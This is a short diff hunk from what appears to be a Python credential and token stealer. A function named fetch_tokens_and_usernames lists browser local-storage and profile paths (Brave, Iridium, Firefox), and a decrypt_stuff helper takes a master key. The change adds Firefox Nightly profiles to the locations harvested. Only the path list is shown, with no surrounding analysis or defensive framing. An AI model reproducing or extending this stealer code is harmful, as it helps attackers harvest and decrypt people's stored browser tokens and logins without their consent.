@@ -54,6 +54,7 @@ def fetch_tokens_and_usernames():
           'Brave': os.path.join(os.getenv("LOCALAPPDATA"), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
           'Iridium': os.path.join(os.getenv("LOCALAPPDATA"), 'Iridium', 'User Data', 'Default', 'Local Storage', 'leveldb'),
           'Firefox': os.path.join(os.getenv("APPDATA"), 'Mozilla', 'Firefox', 'Profiles'),
+          'Firefox Nightly': os.path.join(os.getenv("APPDATA"), 'Mozilla', 'Firefox Nightly', 'Profiles'),
      }
 
      def decrypt_stuff(buff, master_key) -> str:
